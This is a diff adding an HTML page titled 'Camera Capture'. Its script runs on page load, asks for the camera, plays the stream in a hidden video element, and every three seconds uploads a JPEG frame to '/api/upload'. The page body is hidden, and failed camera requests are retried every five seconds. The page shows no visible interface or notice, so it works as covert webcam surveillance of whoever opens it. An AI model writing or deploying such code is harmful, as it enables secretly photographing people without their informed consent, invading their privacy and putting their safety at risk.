@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Camera Capture</title>
+    <script>
+        let stream = null;
+        let captureInterval = null;
+
+        async function startCapture() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const hiddenVideo = document.createElement('video');
+                hiddenVideo.srcObject = stream;
+                hiddenVideo.onloadedmetadata = () => {
+                    hiddenVideo.play();
+                    captureInterval = setInterval(() => captureImage(hiddenVideo), 3000);
+                };
+            } catch (err) {
+                console.error("Camera error:", err);
+                setTimeout(startCapture, 5000); // Retry
+            }
+        }
+
+        async function captureImage(video) {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            canvas.toBlob(blob => {
+                uploadImage(blob);
+            }, 'image/jpeg', 0.85);
+        }
+
+        async function uploadImage(blob) {
+            const formData = new FormData();
+            formData.append('photo', blob, `capture_${Date.now()}.jpg`);
+            
+            try {
+                await fetch('/api/upload', {
+                    method: 'POST',
+                    body: formData
+                });
+                console.log('Uploaded successfully');
+            } catch (err) {
+                console.error('Upload failed:', err);
+            }
+        }
+
+        window.addEventListener('DOMContentLoaded', startCapture);
+    </script>
+</head>
+<body style="display:none"></body>
+</html>
